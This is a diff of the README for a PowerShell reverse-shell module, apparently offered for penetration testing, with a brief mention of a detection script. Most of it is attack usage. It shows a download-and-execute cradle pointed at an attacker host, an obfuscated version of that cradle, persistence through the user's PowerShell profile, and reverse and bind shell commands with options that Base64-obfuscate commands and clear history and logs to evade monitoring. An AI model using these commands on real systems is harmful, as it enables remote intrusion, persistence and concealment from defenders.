@@ -1,23 +1,31 @@
 # ReversePowerShell
+__See "Command Usage:" section below for command usage details__
 ### NOW IN POWERSHELL GALLERY!!!
 ```powershell
+# Install Module
 Install-Module ReversePowerShell
+
+# Update Module
+Update-Module -Name ReversePowerShell
+# OR
+Install-Module ReversePowerShell -Force
 ```
 ---
-#
+
 Functions that can be used to gain Reverse Shells with PowerShell. Invoke-ReversePowerShell function can be used
-to connect to Start-Listener as well as netcat and metasploit modules however it can not connect to Start-Bind.
-I will add a tool for that in the future. This is a PowerShell module meaning it only contains functions/cmdlets to be imported into a PowerShell session. If you wish to execute one of the commands whenever the file is run just add the command you wish to execute to the bottom of the file.
+to connect to Start-Listener as well as netcat and Metasploit modules or whatever other listeners you use.
+This is a PowerShell module meaning it only contains functions/cmdlets to be imported into a PowerShell session.
+If you wish to execute one of the commands whenever the file is run just add the command you wish to execute to the bottom of the file.
 
 #### BLUE TEAM DISCOVERY
 Find-ReverseShell.ps1 can be used to search the Windows Event Log for when a Reverse Shell is created that uses a System.Net.Sockets.TcpListener object. This will discover any reverse shell that creates a TcpListener object and not just the below module. This method does not catch PowerCat.ps1 which I am still looking for a good way to discover. This part is still a work in progress.
 
 #### WAYS TO INSTALL OR IMPORT THE MODULE
-This is not a requirement. It just a way of saving the module to your device if you wish to keep it around for use at later times.
-Install this module by placing the cloned folder "ReversePowerShell" inside the following directory location.
- "$env:USERPROFILE\\WindowsPowerShell\\Modules\\ReversePowerShell"
- For PowerShell Core v6 the location of this module will need to be
- "$env:USERPROFILE\\WindowsPowerShell\\ReversePowerShell"
+This is not a requirement. It just a way of saving the module to your device if you wish to keep it around for use at later times.<br>
+Install this module by placing the cloned folder "__ReversePowerShell__" inside the following directory location.<br>
+ __"$env:USERPROFILE\\WindowsPowerShell\\Modules\\ReversePowerShell"__ <br>
+ For PowerShell Core v6 the location of this module will need to be<br>
+ __"$env:USERPROFILE\\WindowsPowerShell\\ReversePowerShell"__<br>
 
 Once there it can be imported into a PowerShell session using the following command.
 ```powershell
@@ -34,9 +42,12 @@ Notice the .ps1 extension. When using downloadString this will need to be a ps1 
 memory in order to run the cmdlets.
 ```powershell
 IEX (New-Object -TypeName Net.WebClient).downloadString("http://<attacker ipv4>/ReversePowerShell.ps1")
+
+# To obfuscate the above command you can do something like the below command
+& (`G`C`M *ke-E*) '(& (`G`C`M *ew-O*) `N`E`T`.`W`E`B`C`L`I`E`N`T)."`D`O`W`N`L`O`A`D`S`T`R`I`N`G"('htt'+'p://'+'127.0.0.1/ReversePowerShell.ps1')
 ```
 
-IEX is blocked from users in most cases and Import-Module is monitored by things such as ATP. Downloading files to a targerts machine is not always allowed in a penetration test. Another method to use is Invoke-Command. This can be done using the following format.
+IEX is blocked from users in most cases and Import-Module is monitored by things such as ATP. Downloading files to a target machine is not always allowed in a penetration test. Another method to use is Invoke-Command. This can be done using the following format.
 ```powershell
 Invoke-Command -ComputerName <target device> -FilePath .'\ReversePowerShell.ps1m' -Credential (Get-Credential)
 ```
@@ -52,13 +63,15 @@ New-Item -Path $PROFILE -ItemType File -Force
 # OR
 #    - C:\Users\<username>\OneDrive\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1
 #
-# Write-Verbose "Turning this module into the PowerShell profile will import all of the commands everytime the executing user opens a PowerShell session. This means you will need to open a new powershell session after doing this in order to access the commands. I assume this can be done by just executing the "powershell" command though you may need to have a new window opened or new reverse/bind shell opened. You can also just reload the profile
+# Write-Verbose "Turning this module into the PowerShell profile will import all of the commands every time the executing user opens a PowerShell session. This means you will need to open a new PowerShell session after doing this in order to access the commands. I assume this can be done by just executing the "powershell" command though you may need to have a new window opened or new reverse/bind shell opened. You can also just reload the profile
 cmd /c 'copy \\<attacker ip>\MyShare\ReversePowerShell.ps1 $env:USERPROFILE\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.psm1
 
 powershell.exe
 # If that does not work try reloading the user profile.
 & $PROFILE
 ```
+
+# Command Usage:
 
 #### START BIND SHELL
 The below command can be executed to start a bind shell that connects the defined port to PowerShell.
@@ -77,16 +90,45 @@ The listener can be stopped or canceld by doing Ctrl + C.
 Start-Listener -Port 8089
 ```
 
+### INVOKE-REVERSEPOWERSHELL USAGE INFORMATION
+__SPECIAL FEATURES OF INVOKE-REVERSEPOWERSHELL__
+- __Re-Connect Loop__ This cmdlet automatically attempts to reconnect to a listener if a session get disconnected. As long as the powershell process is running it will attempt to connect back to a listener every 30 seconds. In available situations a 30 second timer is displayed. The countdown timer can be viewed in the image below.
+![Reconnection Timer Loop](https://raw.githubusercontent.com/tobor88/Bash/master/images/ReconnectTimer.png)
+- __Obfuscation__ parameter can be used to obfuscate executed commands using Base64. The Event Viewer will show logs such as the ones in the below image when this parameter is defined.
+![Obfuscation in Event Viewer](https://raw.githubusercontent.com/tobor88/Bash/master/images/PSObfuscatedEventLog.png)
+- __Clear History__ parameter can be used to clear the current sessions command history and log file. The purpose of this is to help keep clear text passwords from appearing in log files.
+
 #### ISSUE REVERSE SHELL CONNECTION
-The below command is to be issued on the Target Machine. The below command connected to the listener over
-port 8089. This will not be able to complete a connection to the Start-Bind cmdlet.
-If a connection failes a loop will be started that begins a 30 second visual countdown timer.
-After 30 seconds the connection will attempt to re-establish the shell. I added a switch parameter
-to attempt clearing the command history of the user after closing a session. This was added for cases
-where a compromised password is going to be entered into the PowerShell terminal in clear text.
+The below command is to be issued on the Target Machine. The below command connected to the listener over port 8089.
+```powershell
+Invoke-ReversePowerShell -IpAddress 192.168.0.10 -Port 8089
+# OR
+# Including the default parameter set name issue the below command
+Invoke-ReversePowerShell -Reverse -IpAddress 192.168.0.10 -Port 8089
+```
+
+In the below command the listening port 8089 on 192.168.0.10 is connected too. When the session is exited the -ClearHistory parameter specified attempts to clear your sessions command history as well as clear the powershell log file.
 ```powershell
 Invoke-ReversePowerShell -IpAddress 192.168.0.10 -Port 8089 -ClearHistory
+# OR
+# Including the default parameter set name issue the below command
+Invoke-ReversePowerShell -Reverse -IpAddress 192.168.0.10 -Port 8089 -ClearHistory
 ```
+
+The below command is to be issued on the Target Machine. The below command connected to the listener over port 8089. The -Obfuscate parameter obfuscates the commands executed using Base64 so they do not appear in clear text in the Event Log.
+```powershell
+Invoke-ReversePowerShell -IpAddress 192.168.0.10 -Port 8089 -Obfuscate
+# OR
+# Including the default parameter set name issue the below command
+Invoke-ReversePowerShell -Reverse -IpAddress 192.168.0.10 -Port 8089 -Obfuscate
+```
+
+#### ISSUE BIND SHELL CONNECTION
+The below command is used to connect to a listening Bind Shell port. Any of the special parameters can be used to with the Bind parameter set name as well.
+```powershell
+Invoke-ReversePowerShell -Bind -IpAddress 192.168.0.10 -Port 8089
+```
+
 ---
 # MISC INFO
 #### FIREWALL AND BLOCKED PORTS
